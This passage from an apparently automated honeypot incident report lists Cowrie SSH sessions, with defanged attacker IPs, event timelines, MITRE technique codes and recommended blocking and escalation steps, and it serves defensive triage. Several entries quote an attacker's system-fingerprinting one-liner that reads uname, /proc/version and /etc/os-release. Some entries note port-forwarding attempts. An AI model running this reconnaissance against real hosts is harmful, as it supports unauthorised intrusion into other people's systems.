| `2026-07-24 16:03:11` | `cowrie.command.input` |
| `2026-07-24 16:03:12` | `cowrie.log.closed` |
| `2026-07-24 16:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f5b724ff35

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:04 |
| **Last Seen** | 2026-07-24 16:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:04:27` | `cowrie.session.connect` |
| `2026-07-24 16:04:29` | `cowrie.client.version` |
| `2026-07-24 16:04:29` | `cowrie.client.kex` |
| `2026-07-24 16:04:32` | `cowrie.login.success` |
| `2026-07-24 16:04:33` | `cowrie.session.params` |
| `2026-07-24 16:04:33` | `cowrie.command.input` |
| `2026-07-24 16:04:33` | `cowrie.command.input` |
| `2026-07-24 16:04:33` | `cowrie.command.input` |
| `2026-07-24 16:04:33` | `cowrie.command.input` |
| `2026-07-24 16:04:33` | `cowrie.command.input` |
| `2026-07-24 16:04:33` | `cowrie.command.success` |
| `2026-07-24 16:04:33` | `cowrie.command.input` |
| `2026-07-24 16:04:33` | `cowrie.command.input` |
| `2026-07-24 16:04:33` | `cowrie.command.input` |
| `2026-07-24 16:04:33` | `cowrie.command.input` |
| `2026-07-24 16:04:34` | `cowrie.log.closed` |
| `2026-07-24 16:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd28b31921e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:05 |
| **Last Seen** | 2026-07-24 16:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:05:49` | `cowrie.session.connect` |
| `2026-07-24 16:05:50` | `cowrie.client.version` |
| `2026-07-24 16:05:50` | `cowrie.client.kex` |
| `2026-07-24 16:05:52` | `cowrie.login.success` |
| `2026-07-24 16:05:54` | `cowrie.session.params` |
| `2026-07-24 16:05:54` | `cowrie.command.input` |
| `2026-07-24 16:05:54` | `cowrie.command.input` |
| `2026-07-24 16:05:54` | `cowrie.command.input` |
| `2026-07-24 16:05:54` | `cowrie.command.input` |
| `2026-07-24 16:05:54` | `cowrie.command.input` |
| `2026-07-24 16:05:54` | `cowrie.command.success` |
| `2026-07-24 16:05:54` | `cowrie.command.input` |
| `2026-07-24 16:05:54` | `cowrie.command.input` |
| `2026-07-24 16:05:54` | `cowrie.command.input` |
| `2026-07-24 16:05:54` | `cowrie.command.input` |
| `2026-07-24 16:05:55` | `cowrie.log.closed` |
| `2026-07-24 16:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39dc46db190f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:07 |
| **Last Seen** | 2026-07-24 16:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:07:11` | `cowrie.session.connect` |
| `2026-07-24 16:07:12` | `cowrie.client.version` |
| `2026-07-24 16:07:12` | `cowrie.client.kex` |
| `2026-07-24 16:07:14` | `cowrie.login.success` |
| `2026-07-24 16:07:16` | `cowrie.session.params` |
| `2026-07-24 16:07:16` | `cowrie.command.input` |
| `2026-07-24 16:07:16` | `cowrie.command.input` |
| `2026-07-24 16:07:16` | `cowrie.command.input` |
| `2026-07-24 16:07:16` | `cowrie.command.input` |
| `2026-07-24 16:07:16` | `cowrie.command.input` |
| `2026-07-24 16:07:16` | `cowrie.command.success` |
| `2026-07-24 16:07:16` | `cowrie.command.input` |
| `2026-07-24 16:07:16` | `cowrie.command.input` |
| `2026-07-24 16:07:16` | `cowrie.command.input` |
| `2026-07-24 16:07:16` | `cowrie.command.input` |
| `2026-07-24 16:07:16` | `cowrie.log.closed` |
| `2026-07-24 16:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d072dcaae175

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:08 |
| **Last Seen** | 2026-07-24 16:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:08:34` | `cowrie.session.connect` |
| `2026-07-24 16:08:34` | `cowrie.client.version` |
| `2026-07-24 16:08:34` | `cowrie.client.kex` |
| `2026-07-24 16:08:35` | `cowrie.login.success` |
| `2026-07-24 16:08:39` | `cowrie.session.params` |
| `2026-07-24 16:08:39` | `cowrie.command.input` |
| `2026-07-24 16:08:39` | `cowrie.command.input` |
| `2026-07-24 16:08:39` | `cowrie.command.input` |
| `2026-07-24 16:08:39` | `cowrie.command.input` |
| `2026-07-24 16:08:39` | `cowrie.command.input` |
| `2026-07-24 16:08:39` | `cowrie.command.success` |
| `2026-07-24 16:08:39` | `cowrie.command.input` |
| `2026-07-24 16:08:39` | `cowrie.command.input` |
| `2026-07-24 16:08:39` | `cowrie.command.input` |
| `2026-07-24 16:08:39` | `cowrie.command.input` |
| `2026-07-24 16:08:40` | `cowrie.log.closed` |
| `2026-07-24 16:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae984acff1fe

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:10 |
| **Last Seen** | 2026-07-24 16:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:10:00` | `cowrie.session.connect` |
| `2026-07-24 16:10:00` | `cowrie.client.version` |
| `2026-07-24 16:10:00` | `cowrie.client.kex` |
| `2026-07-24 16:10:02` | `cowrie.login.success` |
| `2026-07-24 16:10:05` | `cowrie.session.params` |
| `2026-07-24 16:10:05` | `cowrie.command.input` |
| `2026-07-24 16:10:05` | `cowrie.command.input` |
| `2026-07-24 16:10:05` | `cowrie.command.input` |
| `2026-07-24 16:10:05` | `cowrie.command.input` |
| `2026-07-24 16:10:05` | `cowrie.command.input` |
| `2026-07-24 16:10:05` | `cowrie.command.success` |
| `2026-07-24 16:10:05` | `cowrie.command.input` |
| `2026-07-24 16:10:05` | `cowrie.command.input` |
| `2026-07-24 16:10:05` | `cowrie.command.input` |
| `2026-07-24 16:10:05` | `cowrie.command.input` |
| `2026-07-24 16:10:05` | `cowrie.log.closed` |
| `2026-07-24 16:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f869a6413ae

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:11 |
| **Last Seen** | 2026-07-24 16:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:11:24` | `cowrie.session.connect` |
| `2026-07-24 16:11:24` | `cowrie.client.version` |
| `2026-07-24 16:11:24` | `cowrie.client.kex` |
| `2026-07-24 16:11:26` | `cowrie.login.success` |
| `2026-07-24 16:11:28` | `cowrie.session.params` |
| `2026-07-24 16:11:28` | `cowrie.command.input` |
| `2026-07-24 16:11:28` | `cowrie.command.input` |
| `2026-07-24 16:11:28` | `cowrie.command.input` |
| `2026-07-24 16:11:28` | `cowrie.command.input` |
| `2026-07-24 16:11:28` | `cowrie.command.input` |
| `2026-07-24 16:11:28` | `cowrie.command.success` |
| `2026-07-24 16:11:28` | `cowrie.command.input` |
| `2026-07-24 16:11:28` | `cowrie.command.input` |
| `2026-07-24 16:11:28` | `cowrie.command.input` |
| `2026-07-24 16:11:28` | `cowrie.command.input` |
| `2026-07-24 16:11:28` | `cowrie.log.closed` |
| `2026-07-24 16:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9851986d61a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:12 |
| **Last Seen** | 2026-07-24 16:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:12:49` | `cowrie.session.connect` |
| `2026-07-24 16:12:50` | `cowrie.client.version` |
| `2026-07-24 16:12:50` | `cowrie.client.kex` |
| `2026-07-24 16:12:51` | `cowrie.login.success` |
| `2026-07-24 16:12:53` | `cowrie.session.params` |
| `2026-07-24 16:12:53` | `cowrie.command.input` |
| `2026-07-24 16:12:53` | `cowrie.command.input` |
| `2026-07-24 16:12:53` | `cowrie.command.input` |
| `2026-07-24 16:12:53` | `cowrie.command.input` |
| `2026-07-24 16:12:53` | `cowrie.command.input` |
| `2026-07-24 16:12:53` | `cowrie.command.success` |
| `2026-07-24 16:12:53` | `cowrie.command.input` |
| `2026-07-24 16:12:53` | `cowrie.command.input` |
| `2026-07-24 16:12:53` | `cowrie.command.input` |
| `2026-07-24 16:12:53` | `cowrie.command.input` |
| `2026-07-24 16:12:53` | `cowrie.log.closed` |
| `2026-07-24 16:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def9526ce28f

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]28` |
| **First Seen** | 2026-07-24 16:12 |
| **Last Seen** | 2026-07-24 16:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:12:55` | `cowrie.session.connect` |
| `2026-07-24 16:12:55` | `cowrie.client.version` |
| `2026-07-24 16:12:55` | `cowrie.client.kex` |
| `2026-07-24 16:12:58` | `cowrie.login.success` |
| `2026-07-24 16:12:58` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]28` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f376496ae385

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-24 16:13 |
| **Last Seen** | 2026-07-24 16:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:13:03` | `cowrie.session.connect` |
| `2026-07-24 16:13:04` | `cowrie.client.version` |
| `2026-07-24 16:13:04` | `cowrie.client.kex` |
| `2026-07-24 16:13:06` | `cowrie.login.success` |
| `2026-07-24 16:13:06` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96e418d335e0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:14 |
| **Last Seen** | 2026-07-24 16:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:14:18` | `cowrie.session.connect` |
| `2026-07-24 16:14:18` | `cowrie.client.version` |
| `2026-07-24 16:14:18` | `cowrie.client.kex` |
| `2026-07-24 16:14:19` | `cowrie.login.success` |
| `2026-07-24 16:14:20` | `cowrie.session.params` |
| `2026-07-24 16:14:20` | `cowrie.command.input` |
| `2026-07-24 16:14:20` | `cowrie.command.input` |
| `2026-07-24 16:14:20` | `cowrie.command.input` |
| `2026-07-24 16:14:20` | `cowrie.command.input` |
| `2026-07-24 16:14:20` | `cowrie.command.input` |
| `2026-07-24 16:14:20` | `cowrie.command.success` |
| `2026-07-24 16:14:20` | `cowrie.command.input` |
| `2026-07-24 16:14:20` | `cowrie.command.input` |
| `2026-07-24 16:14:20` | `cowrie.command.input` |
| `2026-07-24 16:14:20` | `cowrie.command.input` |
| `2026-07-24 16:14:21` | `cowrie.log.closed` |
| `2026-07-24 16:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d38a64ac28

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:15 |
| **Last Seen** | 2026-07-24 16:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:15:46` | `cowrie.session.connect` |
| `2026-07-24 16:15:46` | `cowrie.client.version` |
| `2026-07-24 16:15:46` | `cowrie.client.kex` |
| `2026-07-24 16:15:47` | `cowrie.login.success` |
| `2026-07-24 16:15:49` | `cowrie.session.params` |
| `2026-07-24 16:15:49` | `cowrie.command.input` |
| `2026-07-24 16:15:49` | `cowrie.command.input` |
| `2026-07-24 16:15:49` | `cowrie.command.input` |
| `2026-07-24 16:15:49` | `cowrie.command.input` |
| `2026-07-24 16:15:49` | `cowrie.command.input` |
| `2026-07-24 16:15:49` | `cowrie.command.success` |
| `2026-07-24 16:15:49` | `cowrie.command.input` |
| `2026-07-24 16:15:49` | `cowrie.command.input` |
| `2026-07-24 16:15:49` | `cowrie.command.input` |
| `2026-07-24 16:15:49` | `cowrie.command.input` |
| `2026-07-24 16:15:49` | `cowrie.log.closed` |
| `2026-07-24 16:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-266f441ea398

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 16:15 |
| **Last Seen** | 2026-07-24 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:15:49` | `cowrie.session.connect` |
| `2026-07-24 16:15:49` | `cowrie.client.version` |
| `2026-07-24 16:15:49` | `cowrie.client.kex` |
| `2026-07-24 16:15:50` | `cowrie.login.success` |
| `2026-07-24 16:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1323a1fea8d3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 16:15 |
| **Last Seen** | 2026-07-24 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:15:49` | `cowrie.session.connect` |
| `2026-07-24 16:15:49` | `cowrie.client.version` |
| `2026-07-24 16:15:49` | `cowrie.client.kex` |
| `2026-07-24 16:15:50` | `cowrie.login.success` |
| `2026-07-24 16:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0182664a8962

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 16:15 |
| **Last Seen** | 2026-07-24 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:15:56` | `cowrie.session.connect` |
| `2026-07-24 16:15:56` | `cowrie.client.version` |
| `2026-07-24 16:15:56` | `cowrie.client.kex` |
| `2026-07-24 16:15:56` | `cowrie.login.success` |
| `2026-07-24 16:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea2a504709d0

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-24 16:15 |
| **Last Seen** | 2026-07-24 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:15:57` | `cowrie.session.connect` |
| `2026-07-24 16:15:57` | `cowrie.client.version` |
| `2026-07-24 16:15:57` | `cowrie.client.kex` |
| `2026-07-24 16:15:57` | `cowrie.login.success` |
| `2026-07-24 16:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8058fc7f6af7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 16:16 |
| **Last Seen** | 2026-07-24 16:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:16:07` | `cowrie.session.connect` |
| `2026-07-24 16:16:07` | `cowrie.client.version` |
| `2026-07-24 16:16:07` | `cowrie.client.kex` |
| `2026-07-24 16:16:07` | `cowrie.login.success` |
| `2026-07-24 16:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26fd2fc8c028

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 16:16 |
| **Last Seen** | 2026-07-24 16:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

